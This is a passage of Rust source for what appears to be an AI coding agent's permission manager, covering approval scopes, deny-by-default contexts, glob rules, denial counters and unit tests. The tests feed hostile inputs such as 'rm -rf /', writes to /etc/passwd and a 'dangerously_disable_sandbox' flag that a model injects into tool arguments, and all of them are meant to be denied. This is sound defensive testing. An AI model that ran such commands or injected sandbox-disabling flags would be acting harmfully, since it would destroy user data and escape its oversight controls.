            return Err("execution permit belongs to a different tool call id".to_string());
        }
        let arguments = parse_tool_call_arguments(tool_call)?;
        let resolved = self
            .classify_after_non_bypassable_denials(&tool_call.function.name, &arguments, session_id)
            .map_err(|outcome| match outcome {
                CheckResult::Denied(reason) => reason,
                other => format!("invalid permit validation outcome: {other:?}"),
            })?;
        self.approval_store
            .validate_permit_scope(permit, &resolved, &arguments, session_id)
    }

    fn approvable_scope(
        &self,
        tool_call: &crate::tools::ToolCall,
        session_id: Option<&str>,
    ) -> Result<
        (
            serde_json::Value,
            crate::tools::effect::ResolvedEffect,
            receipts::ApprovalScope,
        ),
        String,
    > {
        self.approval_store.sync_generation()?;
        let arguments = parse_tool_call_arguments(tool_call)?;
        let resolved = self
            .classify_after_non_bypassable_denials(&tool_call.function.name, &arguments, session_id)
            .map_err(|outcome| match outcome {
                CheckResult::Denied(reason) => reason,
                other => format!("invalid approval validation outcome: {other:?}"),
            })?;
        let scope = self
            .approval_store
            .scope_for(&resolved, &arguments, session_id);
        Ok((arguments, resolved, scope))
    }

    fn web_fetch_preapproved_allowed(&self, canonical_tool: &str, target: &str) -> bool {
        if canonical_tool != "WebFetch"
            || !crate::config::is_preapproved(target, &self.web_fetch_preapproved_domains)
        {
            return false;
        }

        Self::log_permission_decision(
            "allowed",
            "web_fetch_preapproved",
            canonical_tool,
            target,
            "",
        );
        true
    }

    /// Context-aware permission check (crosslink #570).
    ///
    /// Identical to [`Self::check`] for explicit allow/deny matches, but
    /// the fall-through branch (no rule matched) is projected through
    /// the supplied [`PermissionContext`]:
    ///
    /// * [`PermissionContext::Interactive`] → [`CheckResult::NeedsPrompt`]
    ///   (same as the legacy `check`)
    /// * [`PermissionContext::SwarmWorker`] | [`PermissionContext::Coordinator`]
    ///   → [`CheckResult::Denied`] with a default-deny reason. These
    ///   contexts have no UI, so prompting the user is impossible; the
    ///   safe-by-default behaviour is to deny.
    ///
    /// A future tightening can elaborate `Coordinator` to relay to the
    /// interactive leader (see #619); the variant exists so call sites
    /// can pre-declare their context now.
    pub fn check_with_context(
        &self,
        tool_name: &str,
        tool_args: &serde_json::Value,
        ctx: PermissionContext,
    ) -> CheckResult {
        match self.check(tool_name, tool_args) {
            CheckResult::Allowed => CheckResult::Allowed,
            CheckResult::Denied(reason) => CheckResult::Denied(reason),
            CheckResult::NeedsPrompt { tool, target } => match ctx {
                PermissionContext::Interactive => CheckResult::NeedsPrompt { tool, target },
                PermissionContext::SwarmWorker | PermissionContext::Coordinator => {
                    CheckResult::Denied(format!(
                        "Default-deny ({ctx:?}): no UI available to prompt for {tool} on '{target}'"
                    ))
                }
            },
        }
    }

    /// Typed-effect auto-allow check (crosslink #571; S-020).
    ///
    /// Only a successfully parsed invocation whose mandatory declaration is
    /// `ReadOnly` can be auto-approved. Bash, edits, writes, and every other
    /// effectful operation always fall through to explicit policy, regardless
    /// of lexical appearance or `threshold`. Explicit denials are evaluated
    /// first and remain authoritative. Non-finite or out-of-range thresholds
    /// disable this compatibility shortcut rather than weakening it.
    pub fn check_auto_allow(
        &self,
        tool_name: &str,
        tool_args: &serde_json::Value,
        threshold: f32,
    ) -> CheckResult {
        // First: any explicit `Deny` rule wins outright.
        if let CheckResult::Denied(reason) = self.check(tool_name, tool_args) {
            return CheckResult::Denied(reason);
        }
        let score = auto_allow_score(tool_name, tool_args);
        let valid_threshold = threshold.is_finite() && (0.0..=1.0).contains(&threshold);
        debug!(
            tool = %tool_name,
            score,
            threshold,
            valid_threshold,
            "typed auto-allow classification"
        );
        if valid_threshold && score > 0.0 && score >= threshold {
            return CheckResult::Allowed;
        }
        // Fall through to the normal pipeline (with interactive context
        // as the default — caller can re-dispatch through
        // `check_with_context` if they need a stricter context).
        self.check(tool_name, tool_args)
    }

    /// Add a session-scoped permission rule.
    pub fn add_session_rule(&mut self, rule: PermissionRule) {
        info!(
            tool = %rule.tool,
            pattern_digest = %digest_text(&rule.pattern),
            decision = ?rule.decision,
            "Added session permission rule"
        );
        if rule.decision == PermissionDecision::Deny {
            if let Err(error) = self.approval_store.bump_generation() {
                warn!(%error, "Could not persist permission capability rotation");
            }
        }
        self.session_rules.push(rule);
    }

    fn unrestricted_bash_construct_hard_safety_denial(
        tool_name: &str,
        tool_args: &serde_json::Value,
    ) -> Option<UnrestrictedSafetyDenial> {
        if !tool_name.eq_ignore_ascii_case("bash") {
            return None;
        }

        let command = tool_args.get("command")?.as_str()?;
        crate::tools::dangerous_shell_construct(command).map(|reason| UnrestrictedSafetyDenial {
            reason: format!(
                "Denied by unrestricted bash hard safety check: dangerous shell construct: {reason}"
            ),
            target: command.to_string(),
        })
    }

    /// Emit a structured permission-decision audit event (crosslink #870).
    ///
    /// `decision` is `"allowed"` or `"denied"`; `decision_source` is a
    /// stable short label like `"scoped_approval_receipt"`,
    /// `"session_policy_rule"`, or `"default_allow_config"`. The event target is
    /// always `"openclaudia::permissions"` and the event name
    /// `"permission_decision"` so log consumers can pivot uniformly.
    fn log_permission_decision(
        decision: &'static str,
        decision_source: &'static str,
        tool: &str,
        target: &str,
        pattern: &str,
    ) {
        let target_digest = digest_text(target);
        let pattern_digest = digest_text(pattern);
        tracing::info!(
            target: "openclaudia::permissions",
            event = "permission_decision",
            decision = decision,
            decision_source = decision_source,
            tool = %tool,
            target_digest = %target_digest,
            pattern_digest = %pattern_digest,
            "permission decision"
        );
    }

    /// Check whether a rule matches a given tool + target.
    fn rule_matches(rule: &PermissionRule, canonical_tool: &str, target: &str) -> bool {
        if !rule.tool.eq_ignore_ascii_case(canonical_tool) {
            return false;
        }
        Self::glob_matches(&rule.pattern, target)
    }

    /// Match a glob-style pattern against a target string.
    ///
    /// Supported glob syntax:
    /// - `*` matches any sequence of non-`/` characters
    /// - `**` matches any sequence of characters (including `/`)
    /// - `?` matches exactly one non-`/` character
    /// - Literal characters match themselves
    ///
    /// The pattern is anchored (must match the entire target).
    /// Compiled regexes are cached in `GLOB_CACHE` so each pattern is only compiled once.
    fn glob_matches(pattern: &str, target: &str) -> bool {
        Self::glob_to_regex_cached(pattern).is_some_and(|re| re.is_match(target))
    }

    /// Return a cached compiled `Regex` for a glob pattern, compiling and caching it on first use.
    ///
    /// Crosslink #813: the prior implementation acquired the lock,
    /// checked the cache, dropped the lock, compiled the regex, then
    /// re-acquired the lock and inserted. Two threads racing through
    /// the same pattern each paid the compile cost AND each fought
    /// over the insert. The fix uses a single lock acquisition:
    /// the lock is held across compile, but the compile is bounded
    /// (regex syntax is fixed-size for any sane glob) and the
    /// contention path short-circuits to the cached value on the
    /// very next access.
    fn glob_to_regex_cached(pattern: &str) -> Option<Regex> {
        // Crosslink #813: single-acquisition, single-release. Build the
        // compile attempt inside the locked critical section but make
        // the closure-driven Entry API carry the work so clippy's
        // `Option::map_or_else`-vs-`if let/else` and "early drop"
        // lints both go quiet. The lock is released at the end of this
        // function automatically when `cache` goes out of scope —
        // there is no other path that holds it.
        let mut cache = GLOB_CACHE
            .lock()
            .unwrap_or_else(std::sync::PoisonError::into_inner);
        // Fast path: cached.
        if let Some(re) = cache.get(pattern) {
            let cached = re.clone();
            drop(cache);
            return Some(cached);
        }
        // Slow path: compile-and-insert.
        let regex_str = Self::glob_to_regex(pattern);
        let compiled = Regex::new(&regex_str);
        let outcome = compiled.as_ref().ok().cloned();
        if let Some(ref re) = outcome {
            cache.insert(pattern.to_string(), re.clone());
        }
        drop(cache);
        if let Err(e) = compiled {
            warn!(pattern_digest = %digest_text(pattern), error = %e, "Invalid glob pattern");
        }
        outcome
    }

    /// Convert a glob pattern to a regex string.
    fn glob_to_regex(pattern: &str) -> String {
        let mut regex = String::from("^");
        let chars: Vec<char> = pattern.chars().collect();
        let mut i = 0;

        while i < chars.len() {
            match chars[i] {
                '*' => {
                    if i + 1 < chars.len() && chars[i + 1] == '*' {
                        // `**` matches everything including path separators
                        regex.push_str(".*");
                        i += 2;
                        // Skip a trailing `/` after `**`
                        if i < chars.len() && chars[i] == '/' {
                            regex.push_str("/?");
                            i += 1;
                        }
                    } else {
                        // `*` matches everything except `/`
                        regex.push_str("[^/]*");
                        i += 1;
                    }
                }
                '?' => {
                    regex.push_str("[^/]");
                    i += 1;
                }
                '.' | '+' | '^' | '$' | '(' | ')' | '{' | '}' | '[' | ']' | '|' | '\\' => {
                    regex.push('\\');
                    regex.push(chars[i]);
                    i += 1;
                }
                c => {
                    regex.push(c);
                    i += 1;
                }
            }
        }

        regex.push('$');
        regex
    }

    /// Get persisted explicit denials for inspection/debugging.
    #[must_use]
    pub fn persisted_rules(&self) -> &[PermissionRule] {
        &self.persisted_rules
    }

    /// Get all session rules (for inspection/debugging).
    #[must_use]
    pub fn session_rules(&self) -> &[PermissionRule] {
        &self.session_rules
    }

    /// Check if the permission system is enabled.
    #[must_use]
    pub const fn is_enabled(&self) -> bool {
        self.enabled
    }

    /// Clear all session rules (called at session end).
    pub fn clear_session_rules(&mut self) {
        if self
            .session_rules
            .iter()
            .any(|rule| rule.decision == PermissionDecision::Deny)
        {
            if let Err(error) = self.approval_store.bump_generation() {
                warn!(%error, "Could not persist permission capability rotation");
            }
        }
        self.session_rules.clear();
    }

    /// Record a `Denied` outcome from the permission classifier (crosslink #572).
    ///
    /// Increments both the consecutive and total denial counters. The
    /// caller (notably the headless agent loop) should then check
    /// [`Self::escalation_state`] and abort cleanly when the result is
    /// [`EscalationState::ShouldAbort`].
    ///
    /// Counter increments saturate at `u32::MAX`; once a threshold has
    /// been exceeded the escalation state is sticky for the remainder of
    /// the session (until [`Self::reset_denial_tracking`] is called).
    /// Parity target: CC `recordDenial` in `utils/permissions/denialTracking.ts`.
    pub fn record_denial(&mut self) {
        self.consecutive_denials = self.consecutive_denials.saturating_add(1);
        self.total_denials = self.total_denials.saturating_add(1);
        debug!(
            consecutive = self.consecutive_denials,
            total = self.total_denials,
            "Recorded permission denial"
        );
    }

    /// Record a successful (allowed) tool outcome (crosslink #572).
    ///
    /// Resets the consecutive denial counter to zero; the total counter
    /// persists for the lifetime of the session. Parity target: CC
    /// `recordSuccess` in `utils/permissions/denialTracking.ts`.
    pub const fn record_allowed(&mut self) {
        self.consecutive_denials = 0;
    }

    /// Current escalation state derived from the denial counters
    /// (crosslink #572).
    ///
    /// Returns [`EscalationState::ShouldAbort`] when either
    /// [`MAX_CONSECUTIVE_DENIALS`] or [`MAX_TOTAL_DENIALS`] has been
    /// exceeded. Parity target: CC `shouldFallbackToPrompting`.
    #[must_use]
    pub const fn escalation_state(&self) -> EscalationState {
        if self.consecutive_denials > MAX_CONSECUTIVE_DENIALS
            || self.total_denials > MAX_TOTAL_DENIALS
        {
            EscalationState::ShouldAbort
        } else {
            EscalationState::Normal
        }
    }

    /// Current consecutive-denial count (for inspection/diagnostics).
    #[must_use]
    pub const fn consecutive_denials(&self) -> u32 {
        self.consecutive_denials
    }

    /// Current total-denial count (for inspection/diagnostics).
    #[must_use]
    pub const fn total_denials(&self) -> u32 {
        self.total_denials
    }

    /// Reset both denial counters to zero (e.g. on session restart).
    ///
    /// The session-cumulative semantics of `total_denials` mean this is
    /// the *only* way to clear it; normal allowed outcomes only reset
    /// the consecutive counter.
    pub const fn reset_denial_tracking(&mut self) {
        self.consecutive_denials = 0;
        self.total_denials = 0;
    }

    /// Current capability generation, exposed for deterministic receipt tests
    /// and trace correlation.
    #[must_use]
    pub fn approval_capability_generation(&self) -> u64 {
        self.approval_store.capability_generation()
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use serde_json::json;
    use tempfile::TempDir;

    fn make_manager(enabled: bool, default_allow: Vec<String>) -> (PermissionManager, TempDir) {
        let dir = TempDir::new().unwrap();
        let persist_path = dir.path().join("permissions.json");
        let mgr = PermissionManager::new(persist_path, enabled, default_allow);
        (mgr, dir)
    }

    fn tool_call(id: &str, name: &str, arguments: &serde_json::Value) -> crate::tools::ToolCall {
        crate::tools::ToolCall {
            id: id.to_string(),
            call_type: "function".to_string(),
            function: crate::tools::FunctionCall {
                name: name.to_string(),
                arguments: arguments.to_string(),
            },
        }
    }

    /// Fix #282/#586: a manager built with `enabled = false` still auto-allows
    /// ordinary calls, but hard safety checks remain non-negotiable. The default
    /// (`PermissionsConfig::default()`) now produces `enabled = true`, so a fresh
    /// install is deny-by-default.
    #[test]
    fn test_disabled_always_allows() {
        // `enabled = false` is an explicit opt-out from prompts/rules —
        // safe calls still short-circuit to Allowed.
        let (mgr, _dir) = make_manager(false, vec![]);
        let result = mgr.check("bash", &json!({"command": "ls -la"}));
        assert_eq!(result, CheckResult::Allowed);
    }

    #[test]
    fn test_disabled_still_denies_hard_safety_bash() {
        let (mgr, _dir) = make_manager(false, vec![]);
        let result = mgr.check("bash", &json!({"command": "rm -rf /"}));
        assert!(
            matches!(result, CheckResult::Denied(_)),
            "#586: enabled=false must not bypass bash hard safety, got: {result:?}"
        );
    }

    /// Fix #282: the DEFAULT `PermissionsConfig` now has `enabled = true` (deny-by-default).
    /// A manager built from `PermissionsConfig::default()` must prompt for ordinary
    /// unmatched calls.
    #[test]
    fn test_default_config_is_deny_by_default() {
        use crate::config::PermissionsConfig;
        let cfg = PermissionsConfig::default();
        assert!(
            cfg.enabled,
            "#282: default PermissionsConfig must have enabled=true"
        );

        let dir = tempfile::TempDir::new().unwrap();
        let persist_path = dir.path().join("permissions.json");
        let mgr = PermissionManager::new(persist_path, cfg.enabled, cfg.default_allow);
        // A fresh default config must NOT auto-allow a normal bash command.
        let result = mgr.check("bash", &json!({"command": "git status"}));
        assert!(
            matches!(result, CheckResult::NeedsPrompt { .. }),
            "#282: default config must produce NeedsPrompt for ordinary bash, got: {result:?}"
        );
    }

    /// Fix #282: serde round-trip — YAML without `permissions.enabled` must default to `true`.
    #[test]
    fn test_permissions_config_serde_default_is_true() {
        use crate::config::PermissionsConfig;
        // Simulate loading config.yaml with no `enabled` key present
        let cfg: PermissionsConfig = serde_yaml::from_str("{}").unwrap();
        assert!(
            cfg.enabled,
            "#282: deserializing PermissionsConfig from empty YAML must yield enabled=true"
        );
    }

    /// Fix #282: serde opt-out — `enabled: false` in YAML still works.
    #[test]
    fn test_permissions_config_serde_explicit_false() {
        use crate::config::PermissionsConfig;
        let cfg: PermissionsConfig = serde_yaml::from_str("enabled: false").unwrap();
        assert!(
            !cfg.enabled,
            "#282: explicit enabled=false in YAML must be respected"
        );
        // An explicitly-disabled manager must short-circuit to Allowed for
        // ordinary calls.
        let dir = tempfile::TempDir::new().unwrap();
        let persist_path = dir.path().join("permissions.json");
        let mgr = PermissionManager::new(persist_path, cfg.enabled, cfg.default_allow);
        let result = mgr.check("bash", &json!({"command": "ls -la"}));
        assert_eq!(
            result,
            CheckResult::Allowed,
            "#282: explicit enabled=false must still short-circuit safe calls to Allowed"
        );
    }

    /// Fix #282: a manager built from the default config denies `write_file`.
    #[test]
    fn test_default_config_denies_write_file() {
        use crate::config::PermissionsConfig;
        let cfg = PermissionsConfig::default();
        let dir = tempfile::TempDir::new().unwrap();
        let persist_path = dir.path().join("permissions.json");
        let mgr = PermissionManager::new(persist_path, cfg.enabled, cfg.default_allow);
        let result = mgr.check("write_file", &json!({"path": "/etc/passwd"}));
        assert!(
            matches!(result, CheckResult::NeedsPrompt { .. }),
            "#282: default config must produce NeedsPrompt for write_file, got: {result:?}"
        );
    }

    #[test]
    fn test_read_only_tools_always_allowed() {
        let (mgr, _dir) = make_manager(true, vec![]);
        // read_file has no permission target, so it's always allowed
        let result = mgr.check("read_file", &json!({"path": "/etc/passwd"}));
        assert_eq!(result, CheckResult::Allowed);
    }

    #[test]
    fn test_bash_needs_prompt_when_no_rules() {
        let (mgr, _dir) = make_manager(true, vec![]);
        let result = mgr.check("bash", &json!({"command": "ls -la"}));
        assert!(matches!(result, CheckResult::NeedsPrompt { .. }));
    }

    #[test]
    fn transient_allow_rules_preapprove_matching_prompt_only_calls() {
        let (mgr, _dir) = make_manager(true, vec![]);
        let rules = [PermissionRule {
            tool: "Bash".to_string(),
            pattern: "git status*".to_string(),
            decision: PermissionDecision::Allow,
        }];

        let result = mgr.check_with_transient_allow_rules(
            "bash",
            &json!({"command": "git status --short"}),
            &rules,
        );

        assert_eq!(
            result,
            CheckResult::Allowed,
            "plugin/skill allowed-tools should preapprove matching commands for one turn"
        );
    }

    #[test]
    fn transient_allow_rules_do_not_override_session_denies() {
        let (mut mgr, _dir) = make_manager(true, vec![]);
        mgr.add_session_rule(PermissionRule {
            tool: "Bash".to_string(),
            pattern: "git status*".to_string(),
            decision: PermissionDecision::Deny,
        });
        let rules = [PermissionRule {
            tool: "Bash".to_string(),
            pattern: "git status*".to_string(),
            decision: PermissionDecision::Allow,
        }];

        let result = mgr.check_with_transient_allow_rules(
            "bash",
            &json!({"command": "git status --short"}),
            &rules,
        );

        assert!(
            matches!(result, CheckResult::Denied(_)),
            "transient allows must not outrank explicit denies: {result:?}"
        );
    }

    #[test]
    fn allowed_tool_spec_parses_bash_scoped_rule() {
        let rules =
            allowed_tool_specs_to_permission_rules(Some(&["Bash(git status *)".to_string()]));

        assert_eq!(rules.len(), 1);
        assert_eq!(rules[0].tool, "Bash");
        assert_eq!(rules[0].pattern, "git status *");
        assert_eq!(rules[0].decision, PermissionDecision::Allow);
    }

    #[test]
    fn allowed_tool_spec_normalizes_legacy_colon_bash_scope() {
        let rules =
            allowed_tool_specs_to_permission_rules(Some(&["Bash(git status:*)".to_string()]));

        assert_eq!(rules.len(), 1);
        assert_eq!(rules[0].tool, "Bash");
        assert_eq!(rules[0].pattern, "git status *");
    }

    #[test]
    fn allowed_tool_specs_skip_read_only_and_unknown_tools() {
        let specs = vec![
            "Read".to_string(),
            "Glob".to_string(),
            "mcp__example__read".to_string(),
            "Write(src/**)".to_string(),
        ];

        let rules = allowed_tool_specs_to_permission_rules(Some(&specs));

        assert_eq!(rules.len(), 1);
        assert_eq!(rules[0].tool, "Write");
        assert_eq!(rules[0].pattern, "src/**");
    }

    #[test]
    fn split_allowed_tool_specs_preserves_spaces_inside_bash_scopes() {
        let specs =
            split_allowed_tool_specs_scalar("Read Bash(git add *) Bash(git status *) Write");

        assert_eq!(
            specs,
            vec![
                "Read".to_string(),
                "Bash(git add *)".to_string(),
                "Bash(git status *)".to_string(),
                "Write".to_string()
            ]
        );
    }

    #[test]
    fn test_default_allow_pattern() {
        let (mgr, _dir) = make_manager(true, vec!["git:*".to_string()]);
        // "git:*" won't match "git status" because the pattern matches differently
        // Let's use a proper glob
        let (mgr2, _dir2) = make_manager(true, vec!["git *".to_string()]);
        let result = mgr2.check("bash", &json!({"command": "git status"}));
        assert_eq!(result, CheckResult::Allowed);

        // Non-matching command still needs prompt
        let result2 = mgr.check("bash", &json!({"command": "rm -rf /"}));
        assert!(matches!(result2, CheckResult::Denied(_)));
    }

    #[test]
    fn test_session_allow_rule() {
        let (mut mgr, _dir) = make_manager(true, vec![]);
        mgr.add_session_rule(PermissionRule {
            tool: "Bash".to_string(),
            pattern: "cargo *".to_string(),
            decision: PermissionDecision::Allow,
        });
        let result = mgr.check("bash", &json!({"command": "cargo build"}));
        assert_eq!(result, CheckResult::Allowed);
    }

    #[test]
    fn test_session_deny_rule() {
        let (mut mgr, _dir) = make_manager(true, vec![]);
        mgr.add_session_rule(PermissionRule {
            tool: "Bash".to_string(),
            pattern: "rm **".to_string(),
            decision: PermissionDecision::Deny,
        });
        let result = mgr.check("bash", &json!({"command": "rm -rf /"}));
        assert!(matches!(result, CheckResult::Denied(_)));
    }

    #[test]
    fn test_always_allow_persistence() {
        let dir = TempDir::new().unwrap();
        let persist_path = dir.path().join("permissions.json");

        let approved = tool_call(
            "approve",
            "edit_file",
            &json!({"path": "src/main.rs", "old_string": "a", "new_string": "b"}),
        );

        // Persist one exact invocation; no raw path/content glob is stored.
        {
            let mgr = PermissionManager::new(&persist_path, true, vec![]);
            let _initial_permit = mgr
                .approve_tool_call_persisted(&approved, None, ApprovalProvenance::InteractiveUser)
                .expect("persist exact approval");
        }

        // A new manager with the same actor/workspace/generation can consume
        // the exact record for the same invocation under a fresh call id.
        {
            let mgr = PermissionManager::new(&persist_path, true, vec![]);
            let replay = tool_call(
                "replay",
                "edit_file",
                &json!({"path": "src/main.rs", "old_string": "a", "new_string": "b"}),
            );
            assert!(matches!(
                mgr.authorize_tool_call(&replay, None),
                AuthorizationResult::Allowed(_)
            ));
        }
    }

    #[test]
    fn test_write_tool_permission() {
        let (mut mgr, _dir) = make_manager(true, vec![]);
        mgr.add_session_rule(PermissionRule {
            tool: "Write".to_string(),
            pattern: "src/**/*.rs".to_string(),
            decision: PermissionDecision::Allow,
        });

        let result = mgr.check("write_file", &json!({"path": "src/lib.rs"}));
        assert_eq!(result, CheckResult::Allowed);

        let result2 = mgr.check("write_file", &json!({"path": "README.md"}));
        assert!(matches!(result2, CheckResult::NeedsPrompt { .. }));
    }

    #[test]
    fn test_glob_to_regex_star() {
        // Single star should not match path separators
        let re = PermissionManager::glob_to_regex("src/*.rs");
        assert_eq!(re, "^src/[^/]*\\.rs$");
        let re = Regex::new(&re).unwrap();
        assert!(re.is_match("src/main.rs"));
        assert!(!re.is_match("src/sub/main.rs"));
    }

    #[test]
    fn test_glob_to_regex_double_star() {
        // Double star should match path separators
        let re = PermissionManager::glob_to_regex("src/**/*.rs");
        let re = Regex::new(&re).unwrap();
        assert!(re.is_match("src/main.rs"));
        assert!(re.is_match("src/sub/deep/main.rs"));
    }

    #[test]
    fn test_glob_engine_retains_empty_string_semantics() {
        // Pin the glob primitive independently of call classification. A
        // permission check must still reject an empty required tool target
        // before this matcher is consulted.
        assert!(PermissionManager::glob_matches("", ""));
        assert!(PermissionManager::glob_matches("**", ""));
    }

    #[test]
    fn test_glob_to_regex_question_mark() {
        let re = PermissionManager::glob_to_regex("file?.txt");
        let re = Regex::new(&re).unwrap();
        assert!(re.is_match("file1.txt"));
        assert!(re.is_match("fileA.txt"));
        assert!(!re.is_match("file12.txt"));
    }

    #[test]
    fn test_malformed_tool_args_denied() {
        let (mgr, _dir) = make_manager(true, vec!["*".to_string()]);
        // command is an integer, not a string — must be denied, not allowed
        let result = mgr.check("bash", &json!({"command": 123}));
        assert!(
            matches!(result, CheckResult::Denied(_)),
            "Malformed bash command (non-string) must be denied, got: {result:?}"
        );
        // path is an array, not a string
        let result = mgr.check("edit_file", &json!({"path": ["/etc/passwd"]}));
        assert!(matches!(result, CheckResult::Denied(_)));
        let result = mgr.check("write_file", &json!({"path": null}));
        assert!(matches!(result, CheckResult::Denied(_)));
    }

    #[test]
    fn test_dangerously_disable_sandbox_in_tool_args_is_denied() {
        // Crosslink #795: a model that injects
        // `dangerously_disable_sandbox: true` into Bash tool args is
        // making an active sandbox-escalation attempt. The previous
        // behaviour was to log a warn and fall through to normal rule
        // processing (so the call usually surfaced as NeedsPrompt).
        // The fix denies the call outright so the escalation attempt
        // is bounded into a hard refusal AND captured in the audit log
        // via the generation-bound `host_safety_decision` tracing event.
        let (mgr, _dir) = make_manager(true, vec![]);
        let result = mgr.check(
            "bash",
            &json!({"command": "rm -rf /", "dangerously_disable_sandbox": true}),
        );
        assert!(
            matches!(result, CheckResult::Denied(_)),
            "dangerously_disable_sandbox in tool args must be DENIED outright, \
             got: {result:?}"
        );
    }

    #[test]
    fn test_clear_session_rules() {
        let (mut mgr, _dir) = make_manager(true, vec![]);
        mgr.add_session_rule(PermissionRule {
            tool: "Bash".to_string(),
            pattern: "*".to_string(),
            decision: PermissionDecision::Allow,
        });
        assert_eq!(mgr.session_rules().len(), 1);
        mgr.clear_session_rules();
        assert_eq!(mgr.session_rules().len(), 0);
    }

    // ── #572 denial tracking ─────────────────────────────────────────────

    /// #572: starting state — both counters zero, escalation state Normal.
    #[test]
    fn denial_tracking_initial_state_is_normal() {
        let (mgr, _dir) = make_manager(true, vec![]);
        assert_eq!(mgr.consecutive_denials(), 0);
        assert_eq!(mgr.total_denials(), 0);
        assert_eq!(mgr.escalation_state(), EscalationState::Normal);
    }

    /// #572: each `record_denial` increments BOTH counters together.
    #[test]
    fn denial_tracking_record_denial_increments_both_counters() {
        let (mut mgr, _dir) = make_manager(true, vec![]);
        for i in 1..=3 {
            mgr.record_denial();
            assert_eq!(
                mgr.consecutive_denials(),
                i,
                "consecutive counter must increment with each denial"
            );
            assert_eq!(
                mgr.total_denials(),
                i,
                "total counter must increment with each denial"
            );
        }
        // Still below MAX_CONSECUTIVE_DENIALS (5) and MAX_TOTAL_DENIALS (20).
        assert_eq!(mgr.escalation_state(), EscalationState::Normal);
    }

    /// #572: exceeding the consecutive threshold escalates to `ShouldAbort`.
    /// Threshold is strict-greater-than, so the (5+1)th consecutive denial trips it.
    #[test]
    fn denial_tracking_consecutive_threshold_escalates() {
        let (mut mgr, _dir) = make_manager(true, vec![]);
        // Push the counter up to the limit — still Normal.
        for _ in 0..MAX_CONSECUTIVE_DENIALS {
            mgr.record_denial();
        }
        assert_eq!(mgr.consecutive_denials(), MAX_CONSECUTIVE_DENIALS);
        assert_eq!(
            mgr.escalation_state(),
            EscalationState::Normal,
            "at-threshold consecutive count must NOT yet abort"
        );
        // One more — now exceed it.
        mgr.record_denial();
        assert_eq!(
            mgr.escalation_state(),
            EscalationState::ShouldAbort,
            "exceeding MAX_CONSECUTIVE_DENIALS must escalate"
        );
    }

    /// #572: `record_allowed` resets the *consecutive* counter only.
    /// Total remains incremented and continues to count toward `MAX_TOTAL_DENIALS`.
    #[test]
    fn denial_tracking_allowed_resets_consecutive_but_not_total() {
        let (mut mgr, _dir) = make_manager(true, vec![]);
        mgr.record_denial();
        mgr.record_denial();
        mgr.record_denial();
        assert_eq!(mgr.consecutive_denials(), 3);
        assert_eq!(mgr.total_denials(), 3);

        mgr.record_allowed();
        assert_eq!(
            mgr.consecutive_denials(),
            0,
            "record_allowed must reset consecutive counter"
        );
        assert_eq!(
            mgr.total_denials(),
            3,
            "record_allowed must NOT reset total counter"
        );
        assert_eq!(mgr.escalation_state(), EscalationState::Normal);
    }

    /// #572: the total threshold escalates *independently* of the consecutive
    /// counter — even if every other denial is interleaved with an allow,
    /// the total counter keeps climbing and eventually trips abort.
    #[test]
    fn denial_tracking_total_threshold_escalates_independently() {
        let (mut mgr, _dir) = make_manager(true, vec![]);

        // Alternate denial/allowed for 21 denials. Consecutive never exceeds 1,
        // but total reaches 21, exceeding MAX_TOTAL_DENIALS (20).
        for _ in 0..=MAX_TOTAL_DENIALS {
            mgr.record_denial();
            mgr.record_allowed();
        }

        assert_eq!(
            mgr.consecutive_denials(),
            0,
            "alternating allowed must keep consecutive at 0"
        );
        assert_eq!(
            mgr.total_denials(),
            MAX_TOTAL_DENIALS + 1,
            "total must equal number of denials despite alternating allows"
        );
        assert_eq!(
            mgr.escalation_state(),
            EscalationState::ShouldAbort,
            "exceeding MAX_TOTAL_DENIALS must escalate even when consecutive is 0"
        );
    }

    /// #572: `reset_denial_tracking` clears both counters and returns to Normal,
    /// even after the consecutive threshold has tripped escalation.
    #[test]
    fn denial_tracking_reset_clears_both_counters() {
        let (mut mgr, _dir) = make_manager(true, vec![]);
        for _ in 0..(MAX_CONSECUTIVE_DENIALS + 2) {
            mgr.record_denial();
        }
        assert_eq!(mgr.escalation_state(), EscalationState::ShouldAbort);

        mgr.reset_denial_tracking();
        assert_eq!(mgr.consecutive_denials(), 0);
        assert_eq!(mgr.total_denials(), 0);
        assert_eq!(mgr.escalation_state(), EscalationState::Normal);
    }

    /// #572: the counter saturates at `u32::MAX` instead of wrapping.
    /// Once the threshold has been crossed the escalation state is sticky.
    #[test]
    fn denial_tracking_counters_saturate_without_wrapping() {
        let (mut mgr, _dir) = make_manager(true, vec![]);
        // Hand-construct a near-overflow state via repeated denials would take
        // 4 billion iterations; instead poke the fields via repeated denials
        // bounded by saturating_add semantics. We simulate by asserting that
        // record_denial after the threshold keeps escalation sticky.
        for _ in 0..(MAX_CONSECUTIVE_DENIALS + 2) {
            mgr.record_denial();
        }
        let snapshot_consecutive = mgr.consecutive_denials();
        let snapshot_total = mgr.total_denials();
        // Many more denials must not wrap around to 0.
        for _ in 0..100 {
            mgr.record_denial();
        }
        assert!(mgr.consecutive_denials() > snapshot_consecutive);
        assert!(mgr.total_denials() > snapshot_total);
        assert_eq!(mgr.escalation_state(), EscalationState::ShouldAbort);
    }

    #[test]
    fn test_current_session_deny_overrides_persisted_allow() {
        let dir = TempDir::new().unwrap();
        let persist_path = dir.path().join("permissions.json");
        let mut mgr = PermissionManager::new(&persist_path, true, vec![]);

        let call = tool_call(
            "edit",
            "edit_file",
            &json!({"path": "src/main.rs", "old_string": "a", "new_string": "b"}),
        );
        let _old_permit = mgr
            .approve_tool_call_persisted(&call, None, ApprovalProvenance::InteractiveUser)
            .expect("persist exact approval");
        // A current explicit deny revokes an older persisted approval.
        mgr.add_session_rule(PermissionRule {
            tool: "Edit".to_string(),
            pattern: "**/*.rs".to_string(),
            decision: PermissionDecision::Deny,
        });

        assert!(matches!(
            mgr.authorize_tool_call(&call, None),
            AuthorizationResult::Denied(_)
        ));
    }
}

/// Phase 2 spec-pinning tests for issue #546.
///
/// These began as pins of `PermissionManager` behavior against the Phase 1
/// spec extracted in crosslink #531. Security expectations are updated when a
/// confirmed audit finding and canonical design supersede an unsafe historical
/// pin; the test name/comment records that change rather than preserving the
/// vulnerability as compatibility behavior.
///
/// Security-critical divergences are marked `// SECURITY: #<issue>`.
/// Denial paths are the dominant test style, matching the permission
/// system's purpose.
#[cfg(test)]
mod phase2_spec_pins {
    use super::*;
    use serde_json::json;
    use tempfile::TempDir;

    // ── helpers ───────────────────────────────────────────────────────────

    fn enabled(default_allow: Vec<&str>) -> (PermissionManager, TempDir) {
        let dir = TempDir::new().unwrap();
        let path = dir.path().join("perms.json");
        let mgr = PermissionManager::new(
            &path,
            true,
